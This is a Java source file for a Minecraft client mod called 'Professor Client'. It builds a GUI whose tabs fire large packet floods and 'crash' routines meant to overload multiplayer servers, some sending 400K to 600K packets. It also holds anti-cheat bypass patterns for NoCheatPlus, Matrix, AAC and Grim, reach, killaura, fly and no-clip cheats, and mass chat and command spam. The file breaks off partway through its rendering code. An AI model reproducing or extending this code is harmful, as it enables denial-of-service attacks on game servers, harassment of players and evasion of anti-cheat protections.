package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.TeleportConfirmC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSelectedSlotC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.MathHelper;

import java.util.LinkedList;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Palette ─────────────────────────────────────────────────────────
    private static final int C_BG     = 0xFF0A0A0F;
    private static final int C_PANEL  = 0xEE0D0D1A;
    private static final int C_CYAN   = 0x00F5FF;
    private static final int C_PURPLE = 0x9B00FF;
    private static final int C_GOLD   = 0xFFD700;
    private static final int C_RED    = 0xFF2200;
    private static final int C_GREEN  = 0x00FF66;
    private static final int C_MUTED  = 0x004455;

    // ── Panel size ───────────────────────────────────────────────────────
    private static final int PW = 500, PH = 350;

    // ── Tabs ─────────────────────────────────────────────────────────────
    private static final String[] TABS = {" FLOOD "," COMBAT "," MOVE "," CHAT "," CRASH "};
    private int   tab     = 0;
    private float tabAnim = 1f;
    private int   tabDir  = 1;

    // ── Bypass modes (8) ─────────────────────────────────────────────────
    private static final String[] BYPASS_NAMES = {
        "OFF", "BURST", "MIXED", "MAX", "NCP", "MATRIX", "AAC", "GRIM"
    };
    private static final String[] BYPASS_DESC = {
        "Raw packets — No obfuscation",
        "Small Y oscillation burst",
        "Mixed Y + Yaw variation",
        "Maximum combo variation",
        "NoCheatPlus bypass pattern",
        "Matrix AC bypass pattern",
        "AAC anti-cheat bypass",
        "Grim AC bypass (vanilla-like)"
    };
    private int bypassMode = 0;

    // ── Widgets ──────────────────────────────────────────────────────────
    private TextFieldWidget pktField  = null;
    private TextFieldWidget chatField = null;
    private TextFieldWidget cntField  = null;

    // ── Status ───────────────────────────────────────────────────────────
    private String  statusText  = "";
    private int     statusColor = 0xFF00F5FF;
    private int     statusTimer = 0;

    // ── Particles ────────────────────────────────────────────────────────
    private static final int PCNT = 200;
    private final float[] ppx = new float[PCNT], ppy = new float[PCNT];
    private final float[] pvx = new float[PCNT], pvy = new float[PCNT];
    private final float[] psz = new float[PCNT], palp = new float[PCNT], pph = new float[PCNT];
    private final int[]   pct = new int[PCNT];

    // ── Mouse trail ──────────────────────────────────────────────────────
    private final LinkedList<int[]> trail = new LinkedList<>();

    // ── Data streams ─────────────────────────────────────────────────────
    private static final String DS = "PROFESSOR01AKASATANA10110100";
    private final float[] dsX = new float[70], dsY = new float[70];
    private final float[] dsSp = new float[70];
    private final int[]   dsCh = new int[70];

    // ── Animation ────────────────────────────────────────────────────────
    private long    tick      = 0;
    private float   scanY     = 0;
    private float   glowPulse = 0f;
    private boolean glowUp    = true;

    private final Random rng = new Random();

    // ── Constructor ───────────────────────────────────────────────────────

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initParticles();
    }

    @Override
    protected void init() {
        initParticles();
        initDataStreams();
        rebuild();
        ProfessorMusicManager.onOpen(client);
    }

    @Override
    public void removed() {
        ProfessorMusicManager.onClose(client);
        super.removed();
    }

    // ── Init helpers ──────────────────────────────────────────────────────

    private void initParticles() {
        for (int i = 0; i < PCNT; i++) {
            ppx[i]  = rng.nextFloat() * 1920;
            ppy[i]  = rng.nextFloat() * 1080;
            pvx[i]  = (rng.nextFloat() - 0.5f) * 0.55f;
            pvy[i]  = -(rng.nextFloat() * 0.65f + 0.1f);
            psz[i]  = rng.nextFloat() * 2.5f + 0.5f;
            palp[i] = rng.nextFloat() * 0.8f + 0.2f;
            pph[i]  = rng.nextFloat() * 6.28f;
            pct[i]  = rng.nextInt(4); // 0=cyan 1=purple 2=gold 3=red
        }
    }

    private void initDataStreams() {
        for (int i = 0; i < 70; i++) {
            dsX[i]  = i * (width / 70f);
            dsY[i]  = rng.nextFloat() * -height;
            dsSp[i] = rng.nextFloat() * 1.1f + 0.4f;
            dsCh[i] = rng.nextInt(DS.length());
        }
    }

    // ── Widget rebuild ────────────────────────────────────────────────────

    private void rebuild() {
        clearChildren();
        pktField = null;
        chatField = null;
        cntField = null;

        int cx  = width / 2;
        int cy  = height / 2;
        int bpx = cx - PW / 2;
        int bpy = cy - PH / 2;

        // Tab buttons
        int tabW = (PW - 16) / TABS.length;
        for (int i = 0; i < TABS.length; i++) {
            final int idx = i;
            int bx = bpx + 8 + i * (tabW + 2);
            addDrawableChild(ButtonWidget.builder(Text.literal(TABS[i]), b -> switchTab(idx))
                .dimensions(bx, bpy + 42, tabW, 18).build());
        }

        switch (tab) {
            case 0 -> buildFlood(cx, bpy);
            case 1 -> buildCombat(cx, bpy);
            case 2 -> buildMove(cx, bpy);
            case 3 -> buildChat(cx, bpy, bpx);
            case 4 -> buildCrash(cx, bpy);
        }

        addDrawableChild(ButtonWidget.builder(Text.literal("X  CLOSE"), b -> close())
            .dimensions(cx - 40, bpy + PH - 28, 80, 18).build());
    }

    private void switchTab(int t) {
        if (t == tab) return;
        tabDir  = t > tab ? 1 : -1;
        tab     = t;
        tabAnim = 0f;
        pktField = null;
        chatField = null;
        cntField = null;
        rebuild();
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 0 — FLOOD
    // ══════════════════════════════════════════════════════════════════════

    private void buildFlood(int cx, int bpy) {
        pktField = new TextFieldWidget(textRenderer, cx - 65, bpy + 95, 130, 16, Text.empty());
        pktField.setMaxLength(6);
        pktField.setText("10000");
        addSelectableChild(pktField);

        int[][] pr = {{100, -140}, {1000, -46}, {10000, 50}, {100000, 145}};
        for (int[] p : pr) {
            int n = p[0], ox = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(n >= 1000 ? (n / 1000) + "K" : "" + n),
                b -> pktField.setText("" + n))
                .dimensions(cx + ox - 25, bpy + 115, 50, 14).build());
        }

        addDrawableChild(ButtonWidget.builder(
            Text.literal("Bypass: " + BYPASS_NAMES[bypassMode]),
            b -> {
                bypassMode = (bypassMode + 1) % BYPASS_NAMES.length;
                b.setMessage(Text.literal("Bypass: " + BYPASS_NAMES[bypassMode]));
            })
            .dimensions(cx - 65, bpy + 133, 130, 16).build());

        addDrawableChild(ButtonWidget.builder(
            Text.literal(">>> SEND FLOOD <<<"),
            b -> doFlood())
            .dimensions(cx - 110, bpy + 155, 220, 22).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 1 — COMBAT
    // ══════════════════════════════════════════════════════════════════════

    private void buildCombat(int cx, int bpy) {
        int bw = 320, bx = cx - bw / 2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Swing Flood  --  8K swings EF bypass"),   b -> combatSwingFlood())  .dimensions(bx, bpy +  72, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Hit Spam  --  rapid interact packets"),    b -> combatHitSpam())     .dimensions(bx, bpy +  94, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Slot Bomb  --  hotbar exploit"),           b -> combatSlotBomb())    .dimensions(bx, bpy + 116, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Attack Desync  --  EF + swing combo"),     b -> combatDesync())      .dimensions(bx, bpy + 138, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Reach Extend  --  pos desync + swing"),    b -> combatReachExtend()) .dimensions(bx, bpy + 160, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  KillAura Bypass  --  swing + move"),       b -> combatKillaura())    .dimensions(bx, bpy + 182, bw, 18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 2 — MOVE
    // ══════════════════════════════════════════════════════════════════════

    private void buildMove(int cx, int bpy) {
        int bw = 320, bx = cx - bw / 2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Y-Axis Desync  --  anti-fly bypass"),     b -> moveYDesync())    .dimensions(bx, bpy +  72, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Speed Boost  --  pos packet bypass"),     b -> moveSpeedBoost()) .dimensions(bx, bpy +  94, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Teleport Ghost  --  desync + confirm"),   b -> moveTeleport())   .dimensions(bx, bpy + 116, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  No-Clip  --  wall phase packets"),        b -> moveNoClip())     .dimensions(bx, bpy + 138, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Fly Bypass  --  NCP ground spoof"),       b -> moveFlyBypass())  .dimensions(bx, bpy + 160, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Position Loop  --  infinite Y flood"),    b -> movePosLoop())    .dimensions(bx, bpy + 182, bw, 18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 3 — CHAT
    // ══════════════════════════════════════════════════════════════════════

    private void buildChat(int cx, int bpy, int bpx) {
        chatField = new TextFieldWidget(textRenderer, cx - 140, bpy + 95, 280, 16, Text.empty());
        chatField.setMaxLength(256);
        chatField.setText("Professor Client was here!");
        addSelectableChild(chatField);

        cntField = new TextFieldWidget(textRenderer, cx - 50, bpy + 115, 100, 14, Text.empty());
        cntField.setMaxLength(4);
        cntField.setText("100");
        addSelectableChild(cntField);

        addDrawableChild(ButtonWidget.builder(Text.literal(">> SPAM CHAT"),    b -> chatSpam())        .dimensions(cx - 130, bpy + 134, 120, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal(">> SPAM COMMAND"), b -> chatCmdSpam())     .dimensions(cx +   10, bpy + 134, 120, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Packet Chat Flood  --  raw chat pkts"), b -> chatPacketFlood()) .dimensions(cx - 155, bpy + 158, 310, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Mass Spam  --  500 messages"),          b -> chatMassSpam())   .dimensions(cx - 155, bpy + 180, 310, 18).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  TAB 4 — CRASH
    // ══════════════════════════════════════════════════════════════════════

    private void buildCrash(int cx, int bpy) {
        int bw = 340, bx = cx - bw / 2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Packet Storm  --  600K pos pkts INSTANT"),   b -> crashPacketStorm())  .dimensions(bx, bpy +  64, bw, 20).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Infinite Y  --  extreme altitude flood"),    b -> crashInfiniteY())    .dimensions(bx, bpy +  88, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Chunk Edge Loop  --  force chunk loads"),    b -> crashChunkEdge())    .dimensions(bx, bpy + 110, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Teleport Bomb  --  65K confirm pkts"),       b -> crashTeleportBomb()) .dimensions(bx, bpy + 132, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Slot Overflow  --  rapid hotbar spam"),      b -> crashSlotOverflow()) .dimensions(bx, bpy + 154, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[6]  Dig Spam  --  action packet flood"),         b -> crashDigSpam())      .dimensions(bx, bpy + 176, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("!!! [7]  COMBO CRASH  --  ALL methods !!!"),      b -> crashCombo())        .dimensions(bx, bpy + 198, bw, 22).build());
    }

    // ══════════════════════════════════════════════════════════════════════
    //  FLOOD LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void doFlood() {
        if (notConn()) return;
        int n;
        try { n = Integer.parseInt(pktField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number!", 0xFFFF4444); return; }
        if (n < 1 || n > 100_000) { setStatus("Range: 1-100,000", 0xFFFF8800); return; }

        double x = px(), y = py(), z = pz();
        float  yw = yw(), pt = pt();
        boolean g = pg();

        switch (bypassMode) {
            case 0 -> { for (int i = 0; i < n; i++) sendMove(x, y, z, yw, pt, g); }
            case 1 -> { for (int i = 0; i < n; i++) sendMove(x, i % 2 == 0 ? y : y + 0.001, z, yw, pt, g); }
            case 2 -> { for (int i = 0; i < n; i++) { sendMove(x, y + (i % 3) * 0.0005, z, yw + (i % 2), pt, g); sendMove(x, y, z, yw, pt, g); } }
            case 3 -> { for (int i = 0; i < n; i++) { sendMove(x, y + (i % 8) * 0.0001, z, yw + (i % 6), pt, false); sendMove(x, y, z, yw, pt, g); } }
            case 4 -> { // NCP bypass
                for (int i = 0; i < n; i++) {
                    double dy = i % 4 == 0 ? y : i % 4 == 1 ? y + 0.0625 : i % 4 == 2 ? y + 0.03125 : y + 0.09375;
                    sendMove(x, dy, z, yw + (i % 3) * 0.15f, pt, i % 3 != 2);
                }
            }
            case 5 -> { // MATRIX bypass
                for (int i = 0; i < n; i++) {
                    float yw2 = yw + (float) Math.sin(i * 0.1) * 2.5f;
                    double dy  = y + Math.sin(i * 0.05) * 0.05;
                    sendMove(x, dy, z, yw2, pt, i % 5 != 4);
                }
            }
            case 6 -> { // AAC bypass
                for (int i = 0; i < n; i++) {
                    double dx2 = x + (i % 2 == 0 ? 0.001 : -0.001);
                    double dz2 = z + (i % 3 == 0 ? 0.001 : i % 3 == 1 ? -0.001 : 0);
                    sendMove(dx2, y + i * 0.000025, dz2, yw, pt, true);
                }
            }
            case 7 -> { // GRIM bypass — vanilla jump arc offsets
                double[] yOffs = {0, 0.0784000015258789, 0.1519844181537628, 0.22140486955642975, 0.28646749757766724};
                for (int i = 0; i < n; i++) sendMove(x, y + yOffs[i % yOffs.length], z, yw, pt, i % yOffs.length == 0);
            }
        }
        setStatus("Sent " + n + " pkts | Bypass: " + BYPASS_NAMES[bypassMode], 0xFF00F5FF);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  COMBAT LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void combatSwingFlood() {
        if (notConn()) return;
        for (int i = 0; i < 8000; i++)
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        setStatus("[COMBAT] Swing Flood -- 8,000 swings!", 0xFF00FF66);
    }

    private void combatHitSpam() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 5000; i++) {
            sendMove(x, y + (i % 4) * 0.0001, z, yw + (i % 6) * 0.5f, pt, false);
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        setStatus("[COMBAT] Hit Spam -- 5K interact+swing!", 0xFF00FF66);
    }

    private void combatSlotBomb() {
        if (notConn()) return;
        for (int i = 0; i < 10000; i++)
            client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i % 9));
        setStatus("[COMBAT] Slot Bomb -- 10K hotbar switches!", 0xFFFFAA00);
    }

    private void combatDesync() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 3000; i++) {
            sendMove(x, i % 2 == 0 ? y + 200 : y, z, yw, pt, false);
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        }
        setStatus("[COMBAT] Attack Desync -- 3K desync+swing!", 0xFF00FFCC);
    }

    private void combatReachExtend() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 6000; i++) {
            sendMove(x + (i % 2 == 0 ? 5 : -5), y, z + (i % 3 == 0 ? 5 : -5), yw, pt, true);
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[COMBAT] Reach Extend -- 6K reach desync!", 0xFF00F5FF);
    }

    private void combatKillaura() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 4000; i++) {
            sendMove(x + (i % 3 - 1) * 0.05, y, z + (i % 3 - 1) * 0.05, yw + (i % 4) * 90, pt, true);
            client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            if (i % 5 == 0) sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[COMBAT] KillAura Bypass -- 4K swing+move!", 0xFFFF6600);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  MOVE LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void moveYDesync() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 10000; i++) {
            double dy = switch (i % 4) { case 0 -> y + 256; case 1 -> y - 64; case 2 -> y + 0.42; default -> y; };
            sendMove(x, dy, z, yw, pt, i % 2 == 0);
        }
        setStatus("[MOVE] Y-Axis Desync -- 10K anti-fly bypass!", 0xFF00F5FF);
    }

    private void moveSpeedBoost() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        double rad = Math.toRadians(yw);
        for (int i = 0; i < 5000; i++) {
            double nx = x - Math.sin(rad) * (i * 0.05);
            double nz = z - Math.cos(rad) * (i * 0.05);
            sendMove(nx, y, nz, yw, pt, true);
            if (i % 10 == 0) sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[MOVE] Speed Boost -- 5K pos pkts!", 0xFF00FF66);
    }

    private void moveTeleport() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 2000; i++) {
            client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
            sendMove(x, y + i * 0.1, z, yw, pt, false);
            sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[MOVE] Teleport Ghost -- 2K confirm+desync!", 0xFF9B00FF);
    }

    private void moveNoClip() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 8000; i++) {
            sendMove(x + (i % 2 == 0 ? 0.3 : -0.3), y + 0.5, z + (i % 3 == 0 ? 0.3 : i % 3 == 1 ? -0.3 : 0), yw, pt, false);
            sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[MOVE] No-Clip -- 8K wall phase pkts!", 0xFF00F5FF);
    }

    private void moveFlyBypass() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        double[] fly = {0.42, 0.3528, 0.2958, 0.2481, 0.2083};
        for (int i = 0; i < 8000; i++) {
            int pi = i % fly.length;
            sendMove(x, y + fly[pi], z, yw, pt, pi == fly.length - 1);
        }
        setStatus("[MOVE] Fly Bypass -- 8K NCP ground spoof!", 0xFFFFAA00);
    }

    private void movePosLoop() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 20000; i++) sendMove(x, y + (i % 1000) * 0.0001, z, yw, pt, i % 1000 == 999);
        setStatus("[MOVE] Position Loop -- 20K infinite Y!", 0xFF9B00FF);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  CHAT LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void chatSpam() {
        if (notConn()) return;
        String msg = chatField.getText().trim();
        if (msg.isEmpty()) { setStatus("Type a message first!", 0xFFFF4444); return; }
        int n;
        try { n = Integer.parseInt(cntField.getText().trim()); } catch (Exception e) { n = 100; }
        n = Math.max(1, Math.min(n, 500));
        for (int i = 0; i < n; i++) client.player.networkHandler.sendChatMessage(msg);
        setStatus("[CHAT] Spammed " + n + "x: " + msg.substring(0, Math.min(20, msg.length())), 0xFF00F5FF);
    }

    private void chatCmdSpam() {
        if (notConn()) return;
        String cmd = chatField.getText().trim().replaceFirst("^/", "");
        if (cmd.isEmpty()) { setStatus("Type a command first!", 0xFFFF4444); return; }
        int n;
        try { n = Integer.parseInt(cntField.getText().trim()); } catch (Exception e) { n = 50; }
        n = Math.max(1, Math.min(n, 200));
        for (int i = 0; i < n; i++) client.player.networkHandler.sendCommand(cmd);
        setStatus("[CHAT] Cmd spam " + n + "x: /" + cmd.substring(0, Math.min(18, cmd.length())), 0xFFFFAA00);
    }

    private void chatPacketFlood() {
        if (notConn()) return;
        String msg = chatField.getText().trim();
        if (msg.isEmpty()) msg = "Professor";
        for (int i = 0; i < 300; i++) client.player.networkHandler.sendChatMessage(msg + " " + i);
        setStatus("[CHAT] Packet Flood -- 300 unique messages!", 0xFF9B00FF);
    }

    private void chatMassSpam() {
        if (notConn()) return;
        String[] msgs = {"Professor Client", "Get hacked lol", "Professor was here", "EZ clap", "Server down soon"};
        for (int i = 0; i < 500; i++) client.player.networkHandler.sendChatMessage(msgs[i % msgs.length] + " " + i);
        setStatus("[CHAT] Mass Spam -- 500 messages!", 0xFFFF2200);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  CRASH LOGIC
    // ══════════════════════════════════════════════════════════════════════

    private void crashPacketStorm() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt(); boolean g = pg();
        for (int i = 0; i < 200000; i++) {
            sendMove(x, y + (i % 999) * 0.0001, z, yw + (i % 7), pt, false);
            sendMove(x, y, z, yw, pt, g);
            sendMove(x, y + (i % 3) * 0.001, z, yw, pt + 1, false);
        }
        setStatus("[CRASH] Packet Storm -- 600K pkts fired!", 0xFFFF2200);
    }

    private void crashInfiniteY() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        double[] ys = {1e7, -1e6, 3e8, -5e5, 1e9, -1e8};
        for (int i = 0; i < 50000; i++) sendMove(x, ys[i % ys.length], z, yw, pt, false);
        for (int i = 0; i < 10000; i++) { sendMove(x, y, z, yw, pt, true); sendMove(x, y + i * 10000, z, yw, pt, false); }
        setStatus("[CRASH] Infinite Y -- 60K extreme pos pkts!", 0xFFFF2200);
    }

    private void crashChunkEdge() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        double cx2 = Math.floor(x / 16) * 16;
        double cz2 = Math.floor(z / 16) * 16;
        for (int i = 0; i < 15000; i++) {
            double nx = cx2 + (i % 2 == 0 ? -0.5 : 16.5);
            double nz = cz2 + (i % 3 == 0 ? -0.5 : i % 3 == 1 ? 16.5 : 8);
            sendMove(nx, y, nz, yw, pt, true);
        }
        setStatus("[CRASH] Chunk Edge -- 15K border pkts!", 0xFFFF6600);
    }

    private void crashTeleportBomb() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt();
        for (int i = 0; i < 65535; i++) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
        for (int i = 0; i < 20000; i++) sendMove(x, y + i * 0.001, z, yw, pt, false);
        setStatus("[CRASH] Teleport Bomb -- 85K pkts!", 0xFFFF2200);
    }

    private void crashSlotOverflow() {
        if (notConn()) return;
        for (int i = 0; i < 50000; i++) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i % 9));
        for (int i = 0; i < 20000; i++) client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
        setStatus("[CRASH] Slot Overflow -- 70K slot+swing pkts!", 0xFFFF2200);
    }

    private void crashDigSpam() {
        if (notConn()) return;
        BlockPos bp = client.player.getBlockPos().down();
        for (int i = 0; i < 30000; i++) {
            client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.START_DESTROY_BLOCK, bp, Direction.DOWN, i));
            client.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.ABORT_DESTROY_BLOCK, bp, Direction.DOWN, i));
        }
        setStatus("[CRASH] Dig Spam -- 60K action pkts!", 0xFFFF6600);
    }

    private void crashCombo() {
        if (notConn()) return;
        double x = px(), y = py(), z = pz(); float yw = yw(), pt = pt(); boolean g = pg();
        // All methods simultaneously — maximum server overload
        for (int i = 0; i < 100000; i++) {
            sendMove(x, y + (i % 9999) * 0.0001, z, yw + (i % 7), pt, false);
            if (i % 3 == 0) client.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            if (i % 5 == 0) client.player.networkHandler.sendPacket(new UpdateSelectedSlotC2SPacket(i % 9));
            if (i % 7 == 0) client.player.networkHandler.sendPacket(new TeleportConfirmC2SPacket(i));
            sendMove(x, y, z, yw, pt, g);
        }
        for (int i = 0; i < 50000; i++) {
            sendMove(x, i % 2 == 0 ? 1e8 : -1e8, z, yw, pt, false);
            sendMove(x, y, z, yw, pt, true);
        }
        setStatus("[CRASH] !!! COMBO CRASH -- 400K+ pkts !!!", 0xFFFF0000);
    }

    // ══════════════════════════════════════════════════════════════════════
    //  PACKET HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private void sendMove(double x, double y, double z, float yw, float pt, boolean g) {
        if (client != null && client.player != null && client.player.networkHandler != null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x, y, z, yw, pt, g));
    }

    private boolean notConn() {
        if (client == null || client.player == null) {
            setStatus("Not connected to a server!", 0xFFFF4444);
            return true;
        }
        return false;
    }

    private void setStatus(String m, int c) { statusText = m; statusColor = c; statusTimer = 240; }

    private double  px() { return client.player.getX(); }
    private double  py() { return client.player.getY(); }
    private double  pz() { return client.player.getZ(); }
    private float   yw() { return client.player.getYaw(); }
    private float   pt() { return client.player.getPitch(); }
    private boolean pg() { return client.player.isOnGround(); }

    // ══════════════════════════════════════════════════════════════════════
    //  TICK & RENDER
    // ══════════════════════════════════════════════════════════════════════

    @Override
    public void tick() {
        super.tick();
        if (statusTimer > 0) statusTimer--;
        tabAnim = Math.min(1f, tabAnim + 0.09f);
        glowPulse += glowUp ? 0.038f : -0.038f;
        if      (glowPulse >= 1f) { glowPulse = 1f; glowUp = false; }
        else if (glowPulse <= 0f) { glowPulse = 0f; glowUp = true;  }
        scanY = (scanY + 2.4f) % PH;
    }

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W = width, H = height, cx = W / 2, cy = H / 2;
        int bpx = cx - PW / 2, bpy = cy - PH / 2;

        // BG
        ctx.fill(0, 0, W, H, C_BG);
        drawGrid(ctx, W, H);
        updateDataStreams(ctx, W, H);
        updateParticles(ctx, W, H);
        drawCenterGlow(ctx, cx, cy);

        // Trail
        updateTrail(mx, my);
        drawTrail(ctx);

        // Panel shadow + panel
        ctx.fill(bpx + 10, bpy + 10, bpx + PW + 10, bpy + PH + 10, 0x66000000);
        ctx.fill(bpx, bpy, bpx + PW, bpy + PH, C_PANEL);

        // Animated border (cyan<->purple shift)
        float t = (float)(tick * 0.038);
        int bR = (int)(Math.abs(Math.sin(t)) * 155);
        int bG = Math.max(0, (int)(200 + 55 * Math.sin(t + 1.5)));
        int bB = Math.max(0, (int)(240 + 15 * Math.sin(t + 3.0)));
        int bA = (int)((0.6f + 0.4f * glowPulse) * 255);
        int bc = (bA << 24) | (bR << 16) | (bG << 8) | bB;
        ctx.fill(bpx,       bpy,       bpx + PW, bpy + 2,    bc);
        ctx.fill(bpx,       bpy+PH-2,  bpx + PW, bpy + PH,   bc);
        ctx.fill(bpx,       bpy,       bpx + 2,  bpy + PH,   bc);
        ctx.fill(bpx+PW-2,  bpy,       bpx + PW, bpy + PH,   bc);
        ctx.fill(bpx + 2,   bpy + 2,   bpx+PW-2, bpy + 3,    (bA/3<<24)|(bR<<16)|(bG<<8)|bB);
        ctx.fill(bpx + 2,   bpy+PH-3,  bpx+PW-2, bpy+PH-2,   (bA/3<<24)|(bR<<16)|(bG<<8)|bB);

        // Gold corners
        int cA = (int)(0xDD * (0.7f + 0.3f * glowPulse));
        drawCorners(ctx, bpx, bpy, (cA << 24) | C_GOLD);

        // Scanline
        ctx.fill(bpx, bpy + (int)scanY, bpx + PW, bpy + (int)scanY + 1, 0x0AFFFFFF);

        // Title
        drawTitle(ctx, cx, bpy, bR, bG, bB);

        // Gold divider
        int gsA = (int)(0x55 * (0.7f + 0.3f * glowPulse));
        ctx.fill(bpx + 10, bpy + 64, bpx + PW - 10, bpy + 65, (gsA << 24) | C_GOLD);

        // Active tab label — CRASH tab gets red color
        float labA = 0.6f + 0.4f * glowPulse;
        int tabLabelCol = tab == 4 ? (int)(labA * 255) << 24 | C_RED : (int)(labA * 255) << 24 | (bc & 0x00FFFFFF);
        String tabLabel = "> " + TABS[tab].trim() + " <";
        ctx.drawText(textRenderer, tabLabel, bpx + 16, bpy + 67, tabLabelCol, false);

        // Tab content text labels
        int soff = (int)((1f - easeOut(tabAnim)) * PW / 2 * tabDir);
        drawTabLabels(ctx, cx, bpy, bpx, soff, bc);

        // Bypass description (FLOOD tab only)
        if (tab == 0) {
            String bdesc = BYPASS_DESC[bypassMode];
            int bda = (int)(80 + 40 * glowPulse);
            ctx.drawText(textRenderer, bdesc, cx - textRenderer.getWidth(bdesc) / 2, bpy + 182, (bda << 24) | C_MUTED, false);
        }

        // Widgets
        if (pktField  != null) pktField.render(ctx, mx, my, delta);
        if (chatField != null) chatField.render(ctx, mx, my, delta);
        if (cntField  != null) cntField.render(ctx, mx, my, delta);
        super.render(ctx, mx, my, delta);

        // Status, music, cursor
        drawStatus(ctx, cx, bpx, bpy);
        drawMusicBar(ctx, bpx, bpy);
        drawCursorGlow(ctx, mx, my);
    }

    // ── BG layers ─────────────────────────────────────────────────────────

    private void drawGrid(DrawContext ctx, int W, int H) {
        int col = 0x05000000 | C_CYAN;
